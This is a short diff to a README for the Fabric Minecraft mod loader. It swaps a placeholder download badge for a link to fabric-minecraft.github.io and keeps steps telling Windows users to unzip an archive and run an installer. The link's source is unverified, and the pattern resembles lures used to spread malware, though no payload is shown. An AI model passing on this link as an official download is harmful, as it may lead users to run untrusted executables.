@@ -8,7 +8,7 @@ Fabric is ideal for users who want a **stable, performance-optimized modding exp
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-yellow?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-yellow?style=for-the-badge)](https://fabric-minecraft.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **Fabric Installer** on your Windows PC.  
